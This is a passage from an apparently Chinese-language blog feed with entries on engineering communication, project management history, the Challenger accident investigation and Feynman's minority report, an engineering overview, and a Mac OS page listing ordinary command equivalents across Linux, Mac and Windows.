    <content type="text"><![CDATA[摘要 沟通形式 创造性表达 训练场景 Overview工程师需要具备的最重要的技能是什么？几乎每一位雇主都会强调的一点就是沟通技巧。 在美国和加拿大负责评审工程学校专业的国家工程与技术组织委员会（Accreditation Board for Engineering and Technlogy,ABET）指出： 在任何学科，口头和书面表达能力将成为工程专业培养的必要组成部分。 一般情况下，沟通形式主要包括： 口头 书面表达 倾听 培养形式： 写作讲习班 语文系列课程（核心课程中注重培养学生的口语演讲能力） 沟通场景： 会谈 演讲 会议 邮件 备忘录 长篇技术报告 期刊论文 How does it works1、专注结构首先，无论何种形式的沟通，必须专注于结构问题。特别是撰写长篇文档之前，还需要进行专门的、尽量全面地规划工作。 你们可以搭建一个稳健、合理、有艺术性的结构。你们可以谋划一个结构，让人愿意一页接着一页看。你们为非虚构作品谋划的结构，要具有一种吸引能力，近似于虚构作品的故事情节。约翰‧麦克菲，美国非虚构写作大师，在普林斯顿大学教授非虚构写作四十余年，其学生中有多位成为普利策奖得主 另外，撰写长篇技术文档需要不间断工作的时间，小心地保护好自己的注意力、保持创造性的状态是成功的关键。改进日常工作比开展日常工作更重要，一些具体的措施建议： 2、绘图技巧注意训练提高工程绘图技术。如果没有撰写思路，或者撰写过程中遇到瓶颈卡壳，那么不妨尝试绘图表达，图形语言是一种深植于人类记忆的本能，是最自然的表达方式。在文字出现以前的很长一段历史中，人类就是通过图形来满足表达需求。金字塔、城市防御工事或其他大型兵器自古以来就是以图样的形式来表达设计思想。可以这么说，即使到今天，人类的大量创造性思维和交流活动仍然需要借助古老的图形语言进行。 创造性思维可遇不可求，适当的准备有助于提高灵感的利用率，不妨试试随身携带铅笔和白纸，相信一段时间之后你会有所收获。 掌握专业工程制图工具，这一点在以前的文章中已经有所讨论 最佳工程实践—思维利器OmniGraffle ，现在个人觉得有必要补充修正的一点是：如果对于某个话题没有深刻理解以前，或者该图形不是为了马上加入到PPT中，一般可以不需要考虑染色的问题。我们进行深度思考的时候，主要精力应集中于事物的本质内涵。 3、环境因素注意搜寻能够让自己专注、放松的舒适环境。 具体情况因人而异，常见的无非两种，一是僻静、无干扰的办公室环境，如果有条件的话、不妨在门口挂上一块“请勿打扰”的醒目牌子；另外也可以是图书馆、咖啡厅这类半开放空间，“第三空间”虽然人来人往看着热闹、但是人群之间一般互不熟悉、也不容易互相打扰。 4、不断练习最后，与任何其他技能一样，提高表达能力需要不断练习，培养耐性并专注细节。只有平时做好充足储备、占有足够的信息细节，忙时才能运用自如、从容不迫。 学习很好地使用你的母语写作 。尽管有一种陈旧的看法认为程序员写作不行 ，但很多黑客 （包括我所知道的那些最优秀的黑客们 ）写得一手好文章 ，而且其数量多得让人吃惊。《大教堂与集市》​ 下面是一些日常工作中常见的练习场景： 会谈一页简短的、突出重点的文档对于非正式会议是非常有帮助的。 项目状态审查：列出自上次会议以来所完成的工作 最近测试情况的报告：表格或图形 产品设计的审查：为正在开发的产品撰写一页文档，列出设计理念的关键特点及优势 公司程序的更改：针对组织变化 正式演讲准备正式演讲的一般流程： 1）了解报告听众的知识背景，包括与会者对报告内容的了解程度、水平，调整报告的内容 2）假设参会人员第一次接触报告的主题 3）在参会人员入场前检查好视听设备 4）穿着得体 5）在最初几分钟内就引出报告的目的 6）告诉参会人员为什么由你来做报告 7）在报告开始时展示出报告的内容大纲，给出将要介绍的内容概述 8）想出一个简短的方式来打破报告开始时的尴尬状态 9）谈话方式简单易懂。将技术细节留在报告后的讨论环节 10）保持谈话简短。讲稿最好只用掉被分配时间的50%-60%，预留时间才能准时结束。 11）自问自答。尽量做到所有的幻灯片格式一致，保持与听众的视线交流。 12）不要给听众展示公式 13）以“谢谢，还有其他问题吗？”来结束报告。或者通过一张总结性的幻灯片来结束报告内容 14）讨论环节。回答者复述提问者的问题，有助于阐明内容、使得所有参会人员都能听到，同时争取思考时间 为非技术人员做演进报告可以遵循以下几个基本原则： 1）假设观众对你的话题一无所知。 2）不使用专业术语解释背景材料。（包括那些看似普通的专用词汇） 3）用一张大的图片作为开场。 4）假设你在跟四年级的小学生讲话。 5）避免向非技术观众展示公式。 撰写邮件撰写一封好的电子邮件应该注意以下几个方面： 邮件头：正确邮件头的的设计将为传递消息确定基调 标题行：简洁、醒目 第一句：邮件第一句的结构直接决定了正文能否被接受，并确保读者不会曲解你写邮件的原因 正文：邮件主体应包含信息传递的关键点。每个想法或观点都应该独立成段，并且每个段落都不能只包含一个句子。段落之间应该具有相应的逻辑联系。（技巧：现在文档编辑器中编写，当对内容满意时，再将其剪切并粘贴到邮件正文中） 技术报告在正式撰写文档之前，尤其需要注意收集各方面的信息，将涉及计算、测试、实验、用户需求和其他可用材料（参考文献、数据和图形）收集起来。 典型技术报告的篇幅在2~20页之间。大多数技术报告应包含以下内容：简介（或背景）、实验搭建、理论、数据、分析和结论。如果包括实验结果，应详细描述实验平台的搭建过程。内容包括描述设备、技术、尺寸及其他关键参数，使对此感兴趣的工程人员能够重建实验平台及实验过程。 期刊论文期刊论文都具有基本一致的标准格式，例如简介部分、理论部分、实验部分、数据部分、分析部分和结论部分。许多出版刊物都对其投稿的论文指定了专门的格式要求。 提案提案的主要目的通常是申请资金支持。除了技术报告部分，提案还包括关于目标、预算、背景及人员等。 说明手册说明手册主要向用户介绍产品的相关信息及有关产品的安装、操作和使用等内容。一份好的产品说明手册还应包括安全信息、故障排除、维修和操作理论（适用原则）等。 注意：内容的重复。文档中的多个衔接处需要对某些信息进行重复描述。不要认为读者所有看过的内容都能记住，编写者需要考虑到每一个细微处的设计。 常规格式：12345678910111213141516## 一、简介## 二、安装## 三、操作## 四、安全性## 五、故障排除#### 1)症状- 可能的原因- 解决方法#### 2)症状- 可能的原因- 解决方法## 六、附录- 原理图- 分解图- 理论- XX列表 工程日志工程日志包括涉及过程中产生的所有想法、计算结果、创新和测试结果。每个项目成员都应保留单独的日志，对应分配给每个人的任务，当项目完成后，所有团队成员的日志都放在一起，形成项目活动的完整记录。 完整的日志还可以用作发明权的证据。 记录没有成功的工作与记录成功的工作同样重要。 确保错误不会在将来重演。 拓展阅读 项目管理 | Overview of Project Management PM指南:PMI项目管理知识体系 PM指南:建筑工程项目管理|行业案例教学 PM指南:范围管理 PM指南:进度管理 PM指南:成本管理 PM指南:质量管理 PM指南:资源管理 PM指南:沟通管理 PM指南:风险管理 PM指南:采购管理 PM指南:相关方管理 PM指南:网络计划技术|工具与技术 PM指南:项目管理信息系统|工具与技术 PM指南:项目管理开局模板|工具与技术 PM指南:开源项目管理平台Redmine|工具与技术 PM指南:软件业看板Kanban管理实践|工具与技术 PM指南:源代码版本管理|工具与技术 参考文献 人工智能玩家发明自己的“语言”，合作“交流”以赢得纸牌游戏 | Matthew Hutson IEEE电气电子工程师学会 3月8日 别把施工日志不当回事，把施工日志写的好的人才有资格做项目负责人！ | 中国土木工程网 2019年9月15日]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[项目管理 | Overview of Project Management]]></title>
    <url>%2F2019%2F02%2F06%2FProject%2F</url>
    <content type="text"><![CDATA[摘要 Overview问题：手艺人需要管理吗？ 构思中，项目管理的起源和早期历史 建筑业：从工匠师傅到营造师现代意义的建筑师出现在欧洲，最早的建筑师就是总营造师，也成建筑师傅。 建筑师负责设计、购买材料、雇佣工匠，并管理工程施工。16世纪至18世纪中期，欧洲兴起华丽的花型建筑热潮，在建筑师队伍中开始形成了分工，一部分建筑师联合起来专注于进行设计，另一部分建筑师则负责组织、监督施工，也就逐步形成了设计和施工的分离。 营造师（Master Builder）：作为建筑项目的最高领导者，营造师必须负责跟进整个工程项目。 建造师（Constructor）：起源于英国，负责全面的组织管理，以工程项目施工管理为主业，通常为项目经理或相关负责人。中国建造师分为一级注册建造师（Constructor）和二级注册建造师（Associate Constructor）。 军事工业：现代项目管理的发祥地项目管理最早起源于美国，是二次世界大战后发展起来的管理技术之一。 关键路径法（CPM）是由美国杜邦公司和兰德公司与1957年联合研究提出的，它假设每项活动的作业时间是确定值，重点在于费用和成本的控制。 项目评估与审查技术（Project Evaluation and Review Technique,PERT）由美国海军首次提出，并于1958年由 Booz、Allen 和 Hamilton 的咨询公司开发。最早的用途是协调在核潜艇发射的“北极星”导弹研发计划，该项目包括 10 000 多个分包商的活动。 PERT 类似关键路径方法(CPM)，是一种用于优化和调度复杂的、相关关联的活动的方法。但是与CPM不同的是，PERT中作业时间是不确定的，采用概率估算，它的重点在于时间控制，并不十分关心项目费用和成本。由此可知，彼时美国海军特种计划局的预算一定非常充足。 软件业：人月神话为什么不灵了Future项目管理的未来发展趋势是什么？英国UCL大学、APM（英国项目管理协会）和全球著名工程咨询公司奥雅纳（ARUP）对此开展了联合研究，发布了《Future of Project Management（项目管理的未来）》研究报告。几个重要节点包括（英国视角）： 1990年前后：奥雅纳发起了项目管理业务；互联网引入1995年前后：CCTA发布了Priince2标准2000年前后：PMBOK发布成为标准；“敏捷项目管理”提出2005年前后：希思罗机场开始运行2010年前后：项目管理作为五大需求技能之一；伦敦奥运会举办2015年前后：移动设备和链接数量超过地球上总人口数量；APM成为英国皇家特许项目职业体系2020年前后：资源危机；项目数据的区块链涌现2025年前后：社会责任成为PMBOK的一章；每秒1TB的光纤开始安装2030年前后：世界100强公司在高层管理层都设有项目管理专业人士2035年前后：项目管理成为英国国家课程的一部分；神经技术（Neuro-technologies）普及2040年前后：智能算法超过专家判断2045年前后：虚拟心灵感应主宰个人沟通 PMI 知识体系美国项目管理协会（Project Management Institute，简写 PMI）成立于1969年，是一个由项目管理专业领域内的研究人员、学者、顾问和经理组成的全球性的专业组织机构。由 PMI 组织编写的《项目管理知识体系指南》在项目管理领域影响深远。 PMI 认为在实际的项目管理中，项目管理存在三重制约（triple constraint），各要素的优先权各有不同。 S 范围 S 范围 T 时间 T 时间 Q 质量 Q 质量 C 成本 C 费用 R 资源 R 风险 关于项目管理生命周期,PMI 提出了五大过程组(Project Management Process Groups)的概念: 启动过程组 | Initiating Process Group 规划过程组 | Planning Process Group 执行过程组 | Executing Process Group 监控过程组 | Monitoring and Controlling Process Group 收尾过程组 | Closing Process Group 项目范围管理 | Project Scope Management 项目进度管理 | Project Schedule Management项目成本管理 | Project Cost Management项目质量管理 | Project Quality Management项目资源管理 | Project Resource Management项目沟通管理 | Project Communications Management项目风险管理 | Project Risk Management项目采购管理 | Project Procurement Management项目相关方管理 | Project Stakeholder ManagementBeyond the ProjectLevel 1. PMP/IPMP 美国项目管理协会 | Project Management Institute, Inc. 费用预算 套餐 PMI/PMP 其它 备注 自学 ￥3900 - 考试时间:09:00~13:00 培训 ￥3900 ￥3800 备考周期：3-4个月 推荐供应商 供应商 授课形式 周期 授课地点 师资 广东省项目管理学会 广州、深圳 3-4个月 广州（广东邮电职业技术学院） 中山大学管理学院 Level 2. Master of Engineering同济大学：经济与管理学院 渊源：建筑工程、建筑与房地产系 流派：皇家特许建造学会（CIOB）、美国项目管理协会（PMI） 《工程项目管理》公开课 | MOOC网 | 学习强国App 同济大学工程管理研究所 | 丁士昭、陈建国 同济大学复杂工程管理研究院 | 丁士昭、乐云 | 重大工程案例研究和数据中心 公众号：“复杂工程视点” 天津大学：管理与经济学部 渊源：铁路工程、机械工程、化学工程 天津大学管理与经济学部 公众号：“全球工程运营” 关注：海外工程、FIDIC、PPP Level 3. BeyondMegaproject 《The Oxford Handbook of Megaproject Management》（重大工程管理牛津指南）主编:牛津大学赛德商学院教授 Bent Flyvbjerg。了解更多&gt;&gt;&gt;&gt;&gt;《重大工程管理牛津指》简介。 《The Anatomy of Major Projects》（重大项目剖析）：剖析了英国一系列的重大项目，例如英法海底隧道等，该书聚焦于应用的实用性，将自身风格定位为“项目管理现实的研究”（study of the reality of project management），所提出的巨型项目十亿美元的基准被广为采用。 《Industrial Megaprojects》（工业巨型项目）：从业主视角强调商业决策制定及项目决策，因此读者对象主要是业主而非学术界。该书具有318个项目的数据，主要是石化、石油以及电站、管道等项目类型，但这些数据并没有经过第三方评审。 《Megaprojects and Risk: An Anatomy of Ambition》（巨型项目和风险：一个雄心的剖析）：对巨型项目及风险进行了详细的分析，主要采用了案例分析方法，包括英法隧道、大贝尔桥等，同时也采用了美国和欧洲等地方的基础设施数据。该书认为，由于没有充分考虑风险以及低水平的风险管理，再加上缺乏问责制，产生了“评价乐观主义”的不良环境，这导致了不准确的估计，进而引发高失败率和大规模成本超支。 项目管理专题 项目管理 | Overview of Project Management PM指南:PMI项目管理知识体系 PM指南:建筑工程项目管理|行业案例教学 PM指南:范围管理 PM指南:进度管理 PM指南:成本管理 PM指南:质量管理 PM指南:资源管理 PM指南:沟通管理 PM指南:风险管理 PM指南:采购管理 PM指南:相关方管理 PM指南:网络计划技术|工具与技术 PM指南:项目管理信息系统|工具与技术 PM指南:项目管理开局模板|工具与技术 PM指南:开源项目管理平台Redmine|工具与技术 PM指南:软件业看板Kanban管理实践|工具与技术 PM指南:源代码版本管理|工具与技术 案例教学 挑战者号航天飞机事故调查|案例 珠海航展交通管控实践|案例 参考文献 项目管理未来：通往2045年之路 |华军辉 复杂工程视点 2019年4月3日 重大工程管理三大经典著作的比较、评价和分析 | 原创： MPCSC 复杂工程视点 2017-01-30 Modern Project Management for Product Managers]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
        <tag>Manager</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[国之重器，在人不在宝|挑战者号航天飞机事故调查]]></title>
    <url>%2F2019%2F02%2F04%2FEngineering-Ethics%2F</url>
    <content type="text"><![CDATA[摘要 挑战者号航天飞机事故调查 理查德·费曼与罗杰斯委员会 工程伦理 很多工程故障不是单单由技术方面的计算错误引起，而是涉及到设计过程失败、维修出错或管理文化失败。– 故障分析专家亨利·裴特斯基（Henry Petroski） 案例较为人知的工程失败事件，有些是技术问题引起的，有些是伦理问题造成的： 福岛第一核电厂事故（2011） 哥伦比亚号航天飞机灾难（2003） 挑战者号航天飞机灾难（1986） 切尔诺贝利核事故（1986） 三丰百货大楼倒塌事件（1995）实际建筑和原本蓝图不符、建筑层数被加高、支柱比原来设计幼兼少放钢筋、额外加置大量保暖设施、用不适当方法移动顶楼的冷气水缸加速楼宇结构损毁，业主发觉楼宇结构出问题只作出维修而非疏散也是导致大量死伤的原因。 新世界酒店（联益大厦）坍塌（1986）大厦设计错误（整栋大厦由业主黄康霖委任不合格的绘图员设计, 而且由业主以妻舅名义成立的空壳建筑公司以非公开招标形式取得建造合约）、实际建筑和原本蓝图不符（事实比图则少了3条支柱）、偷工减料（业主为节省成本, 在建筑过程中要求更改混凝土成分）、由非专业人士设计和监工楼宇建筑，业主发觉楼宇结构出问题只作出维修而非疏散也是导致大量死伤的原因。 中华航空611号班机空难（2002）维修损毁机尾的工程人员错误使用比标准面积较小的蒙皮进行维修，及后22年没有维修人员发觉飞机尾部未完全修复，尤其是1995年中华航空才全面禁烟，但机尾有焦油积，说明1995年禁烟至2002年事发的七年间机尾有裂缝问题没有被维修人员发现。 突尼斯国际航空1153号班机事故（2005）维修油标的工程人员错误换上为ATR-42设计而非为ATR-72设计的油标，令油标无法正确显示肇事客机ATR-72的真正油量, 直接导致飞机引擎在驾驶途中途突然熄火。 挑战者号航天飞机灾难挑战者号航天飞机灾难 发生于美国东部时间1986年1月28日上午11时39分：在佛罗里达州上空刚起飞73秒的挑战者号航天飞机于升空过程中突然爆炸，七名宇航员全部遇难。（飞行任务编号：STS-51-L，美国历史上第25次航天飞机任务，也是挑战者号航天飞机的第10次太空飞行。） 这次事故的媒体报导的覆盖面极广，一项民意调查显示有 85% 的美国人在事故发生后一个小时内就已经听闻这次事件的新闻。七名机组人员中包括一名中学教师克里斯塔·麦考利芙（Christa McAuliffe） —— 她从11,000多名申请者中脱颖而出，参加了NASA组织的空间教师项目，按照计划她将在太空授课，因为观看直播的人群中包括全美半数以上的中小学生。 这次灾难性事故导致美国的航天飞机飞行计划被冻结了长达32个月之久。 事故调查《罗杰斯报告》美国总统罗纳德·里根下令组织一个特别委员会——航天飞机挑战者号事故总统调查委员会(以其主席的名字,常称作 罗杰斯委员会)负责此次事故的调查工作。 罗杰斯委员会工作了几个月后于1986年6月9日发表了一份长达225页的研究报告（《罗杰斯报告·正文》）。 调查报告指出挑战者号的意外是由右侧固体火箭助推器尾部一个密封接缝的O型环失效，导致加压的热气和火焰从紧邻的外加燃料舱的封口喷出，造成结构损坏。O型环的失效则归因于设计上的缺陷，密封环没有针对寒冷天气设计，发射当天佛罗里达州异常寒冷（零下2摄氏度），过度冰冷的密封圈会因为太僵硬而不能很好地密封火箭助推器，或者在异常低温条件下变脆、破裂。报告也考虑到了意外的成因。最明显的就是NASA与承包商的疏忽，莫顿·塞奥科公司承认了他们在设计上存在的缺陷。罗杰斯报告的正式结论是“一场肇由历史的事故”。 在沟通上的失败……发射决策是创建在不完善与时常误导的信息上的。冲突存在于…..一个允许航天飞机管理层忽略掉潜在的飞行安全问题的NASA管理结构之间。 少数派调查报告调查委员会最著名的成员之一是理论物理学家理查德·费曼。他用他自己的方法而不是按照委员会的日程表进行调查，这种行事风格使得他与官僚、保守的委员会主席罗杰斯发生了争执。 Feynman is becoming a real pain. – William P. Rogers 费曼在调查过程中直接访问了大量一线工程师，他发现 NASA 管理层对于风险概率的理解与一下工程师有完全不同：工程师坦言，在这次太空计划中，宣传起了主导作用，审慎和安全则退居其次。 官方管理层声称，他们相信飞行计划失败的概率是这个数据的1/1000。他们这么做的一个原因可能是：让政府看到NASA计划周全，还能按时把事情干得很漂亮，以确保政府给予资金支持。另一个原因可能是他们真的相信失败率极低——这说明他们和一线工程师的沟通严重缺乏，甚至到了匪夷所思的地步。 在综合考虑后，项目成员单位的一线工程师给出的失败概率估计值为： 火箭发动机制造商洛克达因（Rocketdyne）： 1/10000 马歇尔太空飞行中心:1/300 NASA聘请的独立工程顾问：1/100 或 1/50 作为项目管理者 NASA 对外宣称的失败概率只有 1/100000。 除了针对固体燃料火箭展开调查，费曼也对航空电子系统（包括硬件、软件）进行了深入分析： 现在总结一下，计算机软件检测体系及其检测的仔细程度确实达到了最高水准。 这里并没有出现这种情况:一边降低标准一边自欺欺人一一对于固体火箭助推器或航天飞机主发动机的安全体系来说，这种情况很明显。确实，管理层最近已经提议要减少这样复杂、耗资又如此巨大的测试——他们认为， 在航天飞机发展业已成熟的现阶段，做这些测试是没有必要的。我们必须抵制这些建议，因为持这种看法的人，他们没有认识到微妙的相互影响，整个项目的某一部分即便一个很细微的变化导致的错误也会影响到项目的其他组成部分。 飞船的使用者一直在不断地提各种修改要求:要么提出新的任务，要么提出新的要求和修改意见。而按照他们的要求进行修改，代价很昂贵，因为需要做全面的测试。要省钱，合理的办法是尽可能减少变动，而不是降低每一次改动后 (必须要做的)测试的水准。 最重要的是，费曼深刻揭露了 NASA 管理文化中的官僚习气。 根据调查，费曼得出结论认为 NASA 管理层对科学的理解有严重缺陷，内部缺乏沟通、对于危险的认识严重歪曲。与费曼不同，调查委员会的大部分成员虽然对美国宇航局提出了批评意见，但是同时明确肯定了挑战者号灾难应该由 NASA 内部解决，不需要暂停其运营或减少财政资金投入。费曼认为，委员会的结论歪曲了他们的调查结果，他无法良心地建议像NASA这样一个存在严重缺陷的组织应该在没有停止运营和重大改革的情况下继续下去。 起初，费曼的调查结论并不被委员会接受。费曼多次威胁要从报告中删除他的名字，并且强烈要求在报告中包括他对航天飞机可靠性的个人观察。最后，费曼的少数派报告才被包括在正式调查报告的附录F中公开。 费曼总结道： NASA的管理层都夸大了其产品的可靠性，达到了幻想的程度。 在签订合同、估算成本和评估项目难度等环节，他们也一定要秉承实事求是的态度。他们提出的飞行计划的时间安排一定要合理和切合实际，实施过程中也不至于为了赶期限导致状况百出。如果他们一一照做了，却得不到政府的支持，那就随他去吧。 对于一项成功的技术来说，尊重现实一定要凌驾于公共关系之上，因为你不能愚弄自然。 2003年2月1日，哥伦比亚号航天飞机执行STS-107任务发生事故，机上7名宇航员全部遇难。根据事后的调查报告，哥伦比亚号在轨道上时，一些NASA工程师怀疑左翼已经受损，但是管理人员限制了进一步调查。 所谓 国之重器，在人不在宝 。 罗杰斯委员会 罗杰斯委员会由前国务卿威廉·罗杰斯领衔，传奇航天员阿姆斯特朗任副主席，成员包括宇航员、律师、军方代表和工程技术专家： 威廉·罗杰斯,William P. Rogers：调查委员会主席。前美国国务卿（尼克松任内）、前司法部长（艾森豪威尔任内），时年73岁。二战时作为海军中尉服役于无畏号航空母舰，战后为纽约市律师事务所合伙人、参议院法律顾问, 在最高法院“纽约时报公司诉沙利文案”中也担任了重要角色。 尼尔·阿姆斯特朗,Neil A. Armstrong：调查委员会副主席。首位登月者，退役航天员，时年56岁。1971年8月从航空航天局辞职后加入辛辛纳提大学（University of Cincinnati）工程系担任教授。退休后非常低调，婉拒多个政党邀请从政、非常审慎选择代言企业。他在多个大学（包括母校普渡大学）中选择规模较小的辛辛那提大学的主要是因为不想引起同事的反感；他不想因为自己学位不高而直接担任教授让其他人不满。 奥尔顿·基尔,Alton Keel:调查委员会执行秘书。工程师，外交官和商人。弗吉尼亚大学航空航天工程博士。早年从事海军武器研发管理，曾任空军助理部长（研究，开发和后勤）（1981-82）和管理和预算办公室副主任（1982-86）。调查结束之后，基尔就任美国驻北约常驻代表，于2007年担任私人投资银行集团Atlantic Partners LLC的总裁兼董事总经理。 大卫·艾奇逊,David Campion Acheson：执业律师。曾任美国原子能委员会律师/哥伦比亚特区检察官/财政部长特别助理,前国务卿迪恩·艾奇逊的儿子，时年65岁。 唐纳德·秋提那,Donald J. Kutyna：空军将领，美军太空系统指挥、控制和通信主管。后任北美防空司令部司令、美军太空司令部司令、四星上将退役。 罗伯特·霍茨,Robert B. Hotz：《航空周刊》编辑（ Aviation Week And Space Technology ） 莎莉·莱德,Sally K. Ride：美国第一位女航天员，时年35岁。后任加利福尼亚大学圣迭戈分校物理学教授，也是第一个公开承认是同性恋的宇航员。 查克·耶格尔,Charles E. Yeager：空军退役准将，美国空军的重要偶像人物，二战英雄、王牌飞行员&amp;NASA试飞员。高中学历，从未上大学，时年63岁。 小亚瑟·沃克,Arthur BC Walker Jr.:伊利诺伊大学天体物理博士，光学先驱,曾设计制造太阳望远镜，早年曾任美国空军少尉在武器实验室工作。黑人物理学家社区领袖，莎莉·莱德是其在斯坦福大学的第一个研究生。 尤金·科弗特,Eugene E. Covert：航空专家。麻省理工博士，美国空军首席科学家。参与建造第一个实用的风洞磁悬浮系统，1981年获得NASA公共服务奖，时年60岁。 约瑟夫·萨特,Joseph F. Sutter：波音公司工程师，波音747之父, 时年65岁。 阿尔伯特·惠尔伦,Albert D. Wheelon：时年57岁、任休斯飞机公司(Hughes)执行副总裁。Wheelon 博士于1962年加入中央情报局，直到1966年担任科学和技术副主任。美国国家工程院院士，IEEE 和 AIAA 会士。 罗伯特·拉梅尔,Robert W. Rummel：航空航天工程师，时年71岁（serving on the operations subpanel. I headed the design panel for the commission）。曾在洛克希德飞机公司工作，1943年加入环球航空（Trans World Airlines，TWA）并于1969年被任命为技术开发副总裁。 理查德·费曼,Richard P. Feynman：物理学家 资料卡 Hughes 是一家拥有80,000名员工的高科技公司，建造了大量军事和科学卫星，还生产了世界上50％以上的商业通信卫星。罗杰斯委员会成员罗伯特·拉梅尔在环球航空工作期间，同时担任休斯飞机公司航空事务顾问。 休斯飞机公司（Hughes Aircraft）休斯飞机公司（Hughes Aircraft）曾是美国一家主要的防务和航天公司。由霍华德·休斯 Howard Robard Hughes, Jr. 在1932年创建。 休斯飞机公司是美国空军的主要导弹供应商之一，著名产品包括AIM-4、AIM-120（雷达引导中程空对空导弹）等。休斯飞机公司同时是美军重要的直升机供应商，其最著名的产品为H-17、O/AH-6、AH-64阿帕奇武装直升机（1996年并入波音公司）。 1985年休斯飞机公司被通用汽车以50亿美元收购，和其名下的Delco电气及休斯网络系统整合为休斯电子。在随后的约二十年间，通用汽车将原休斯名下的产业逐步出售。 环球航空（Trans World Airlines，TWA）TWA 为美国知名航空公司，总部设于密苏里州的圣路易斯。T&amp;WA在四十年代和五十年代由 霍华德·休斯 Howard Robard Hughes, Jr. 掌控，在二战后一直与泛美航空瓜分美国国际航线，并且在跨大西洋航线竞争中处于领先地位。在1988年的夏季，环球航空第一次也是唯一一次，服务超过50%的旅客往返大西洋两岸。 1992年TWA第一次破产（空运管制法案的废除大大冲击环航） 1995年TWA第二次破产 1996年7月17日，环航一架波音747（机队编号N93119）在大西洋上空爆炸，机上230人全数遇难。 2001年被美国航空并购并结业 波音公司（The Boeing Company）波音公司是世界最大的航天航空器制造商，同时也是全球第二大国防承包商，军售武器量仅仅次于洛克希德·马丁。2014年，波音公司国防部门销售总额达到290亿美元，占波音公司总收入的32%-35%左右。 洛克达因公司（Rocketdyne）普莱特和惠特尼洛克达因公司 Pratt &amp; Whitney Rocketdyne, Inc.是美国的一家主要从事液体燃料火箭发动机设计研发的公司，总部位于加利福尼亚州卡诺伽园。 拓展阅读 人物：理查德·费曼 参考文献 Rogers Commission Report 哥伦比亚号航天飞机灾难 加班越狠，出成绩就越多吗？在NASA，这叫做Go Fever |原创： 余晟 余晟以为长期加班就会导致工作重心的变化，关注的不是最终目的的完成，而只是程序性地完成每天的工作量。但是，高科技项目往往需要去发现并解决各种事先想不到的问题，而这恰恰是程序性工作的空白——“阿波罗1号”的悲剧就是最好注解。 【深度】航天项目研制风险管理模型 | 北京宇航系统工程研究所]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
        <tag>Policy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[工程学 | Overview of Engineering]]></title>
    <url>%2F2019%2F01%2F07%2FEngineering%2F</url>
    <content type="text"><![CDATA[摘要 Introduction to Engineering工程学是指将知识（通常是科学，数学和经验）应用于结构，机器，材料，设备，系统，过程和组织的创新，设计，构造，操作和维护。 The activity of applying scientific knowledge to the design, building, and control of machines,roads, bridges, electrical equipment,etc. ——《牛津英语词典》 Engineering is the application of knowledge, typically in the form of science, mathematics, and empirical evidence, to the innovation, design, construction, operation and maintenance of structures, machines, materials, devices, systems, processes, and organizations. —— Wiki 创新工程设计RAMSRAMS 即可靠性(Reliability)、可用性(Availability)、可维护性(Maintainability) 和安全性(Safety)的简称。 可靠性工程 | Overview of Reliability 失效分析 可靠性设计 安全性设计 风险评估 未分类： 工程设计：容灾 工程组织 组织理论与设计 工程伦理 国之重器，在人不在宝 | 挑战者号航天飞机事故调查 应用个人生产力 场景化过程改进之个人效率提升 软件工程领域 Software Engineering of Google 开源软件的六大运营挑战 软件工程实践中的十大法则 网络工程领域建筑工程领域 《建筑的复杂性与矛盾性》 《图像中国建筑史》| 梁思成 交通工程领域 《明代的漕运》| 黄仁宇 挑战者号航天飞机事故调查 珠海航展交通管控实践 艺术领域 数据可视化（八）Program,Data and Classical Music Engineering Resources Engineering Blog Engineering Index 阅读作业#####《工程思维 Design Concepts for Engineers》 作者：马克 N.霍伦斯坦(Mark N.Horenstein)， 翻译：宫晓利/南开大学 张金/南开大学 赵子平/天津师范大学 《 To Engineer is Human: The Role of Failure in Successful Design (1985)》|Henry Petroski拓展阅读 项目管理 | Overview of Project Management PM指南:PMI项目管理知识体系 PM指南:建筑工程项目管理|行业案例教学 PM指南:范围管理 PM指南:进度管理 PM指南:成本管理 PM指南:质量管理 PM指南:资源管理 PM指南:沟通管理 PM指南:风险管理 PM指南:采购管理 PM指南:相关方管理 PM指南:项目管理信息系统|工具与技术 PM指南:项目管理开局模板|工具与技术 PM指南:开源项目管理平台Redmine|工具与技术 PM指南:软件业看板Kanban管理实践|工具与技术 PM指南:源代码版本管理|工具与技术 参考文献 A FIELD GUIDE TO TRANSMISSION LINES | 电力传输网络 世界最长十大隧道|中科院地质地球所 力学与工程：一名优秀的工程师首先是力学家 | 声振之家 2018-06-11]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mac OS 操作系统专题]]></title>
    <url>%2F2019%2F01%2F05%2FMac%2F</url>
    <content type="text"><![CDATA[摘要 The History Overview of the Mac Application and Development Future This article is part of an Mac Operating System tutorial series. Make sure to check out my other articles as well: 谁是王者：macOS vs Linux Kernels ？ 数据可视化（一）思维利器 OmniGraffle for Mac 使用指南 我的写作工具链 The Big PictureThe History 谁是王者：macOS vs Linux Kernels ？ Overview of the Mac快键键1234567891011⌘——Command ()⌃ ——Control⌥——Option (alt)⇧——Shift⇪——Caps Lockfn——功能键 Basic Commands 操作 Linux Mac Windows 字符匹配 grep grep findstr 查看网卡 ifconfig ifconfig ipconfig 查看网络路由 route -n netstat -ar netstat -ar route PRINT 查看网络连接 netstat -an netstat -an netstat -an 更新动态库 ldconfig update_dyld_shared_cache —- hosts /etc/hosts//private/etc/hosts —– debug strace dtruss —– 查看库依赖 ldd otool -L —- 进程管理 ps ps tasklist 进程管理 kill kill taskkill /pid /T /F 环境变量 env [print]printenv [init] ~/.bash_profile 压缩加密 zip -e ./jiami.zip aa.txt 磁盘管理 diskutil 12345$ diskutil list$ diskutil mountDisk /dev/disk2Volume(s) mounted successfully$ diskutil unmountDisk /dev/disk2Unmount of all volumes on disk2 was successful 网络管理 NAT 1234/Library/Preferences/VMware Fusion/vmnet8/nat.conf# NAT gateway addressip = 192.168.213.2netmask = 255.255.255.0 Application and DevelopmentPersonal Level 我的写作工具链 Enterprise Level 数据可视化（一）思维利器 OmniGraffle for Mac 使用指南 Hardware How to Fix Early 2015 MacBook Pro Touchpad Keyboard Keyboard and trackpad don’t work, loose cable? touchpad TrackPad 丝带排线替换821 – 00184-a 适用于 Apple MacBook Pro Retina 33 cm 